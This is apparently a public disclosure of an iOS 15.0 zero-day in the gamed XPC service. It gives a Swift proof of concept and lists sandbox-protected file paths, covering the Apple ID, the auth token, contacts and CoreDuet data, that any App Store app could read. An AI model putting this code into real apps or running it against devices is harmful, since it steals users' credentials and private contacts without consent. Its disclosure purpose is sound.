# Gamed 0-day (iOS 15.0)

Any app installed from the App Store may access the following data without any prompt from the user:
- Apple ID email and full name associated with it
- Apple ID authentication token which allows to access at least one of the endpoints on *.apple.com on behalf of the user
- Complete file system read access to the Core Duet database (contains a list of contacts from Mail, SMS, iMessage, 3rd-party messaging apps and metadata about all user's interaction with these contacts (including timestamps and statistics), also some attachments (like URLs and texts))
- Complete file system read access to the Speed Dial database and the Address Book database including contact pictures and other metadata like creaton and modification dates (I've just checked on iOS 15 and this one inaccessible, so that must have been quietly fixed)



Here is a short proof of concept.

```swift
let connection = NSXPCConnection(machServiceName: "com.apple.gamed", options: NSXPCConnection.Options.privileged)!
let proxy = connection.remoteObjectProxyWithErrorHandler({ _ in }) as! GKDaemonProtocol
let pid = ProcessInfo.processInfo.processIdentifier
proxy.getServicesForPID(pid, localPlayer: nil, reply: { (accountService, _, _, _, _, _, _, _, utilityService, _, _, _, _) in
	accountService.authenticatePlayerWithExistingCredentials(handler: { response, error in
		let appleID = response.credential.accountName
		let token = response.credential.authenticationToken
	}

	utilityService.requestImageData(for: URL(fileURLWithPath: "/var/mobile/Library/AddressBook/AddressBook.sqlitedb"), subdirectory: nil, fileName: nil, handler: { data in
		let addressBookData = data
	}
}
```

How it happens:
- XPC service `com.apple.gamed` doesn't properly check for `com.apple.developer.game-center` entitlement
- Even if Game Center is disabled on the device, invoking `getServicesForPID:localPlayer:reply:` returns several XPC proxy objects (`GKAccountService`, `GKFriendService`, `GKUtilityService`, etc.).
- If game center is enabled on the device (even if it's not enabled for the app in App Store Connect and app doesn't contain `com.apple.developer.game-center` entitlement), invoking `authenticatePlayerWithExistingCredentialsWithHandler:` on `GKAccountService` returns an object containing Apple ID of the user, DSID and Game Center authentication token (which allows to send requests to `https://gc.apple.com` on behalf of the user). Invoking `getProfilesForPlayerIDs:handler:` on GKProfileService returns an object containing first and last name of the user's Apple ID. Invoking `getFriendsForPlayer:handler:` on `GKFriendService` return an object with information about user's friend in Game Center.
- Even if game center is disabled, it's not enabled for the app in App Store Connect and app doesn't contain `com.apple.developer.game-center` entitlement, invoking `requestImageDataForURL:subdirectory:fileName:handler:` on `GKUtilityService` allows to read arbitrary files outside of the app sandbox by passing file URLs to that method. Among the files (but not limited to) that can be accessed that way are the following:
`/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist` - contains mobile gestalt cache
`/var/mobile/Library/CoreDuet/People/interactionC.db` - contains a list of contacts from Mail, SMS, iMessage, 3rd-party messaging apps and metadata about user's interaction with these contacts (including timestamps and statistics)
`/var/mobile/Library/Preferences/com.apple.mobilephone.speeddial.plist` - contains favorite contacts and their phone numbers
`/var/mobile/Library/AddressBook/AddressBook.sqlitedb` - contains complete Address Book database
`/var/mobile/Library/AddressBook/AddressBookImages.sqlitedb` - contains photos of Address book contacts
- Invoking `cacheImageData:inSubdirectory:withFileName:handler:` on GKUtilityService might allow to write arbitrary data to a location outside of the app sandbox.

On the [Apple Security Bounty Program page](https://developer.apple.com/security-bounty/payouts/) this vulnerabilty is evaluated at $100,000 (Broad app access to sensitive data normally protected by a TCC prompt or the platform sandbox. “Sensitive data” access includes gaining a broad access (i.e., the full database) from Contacts).
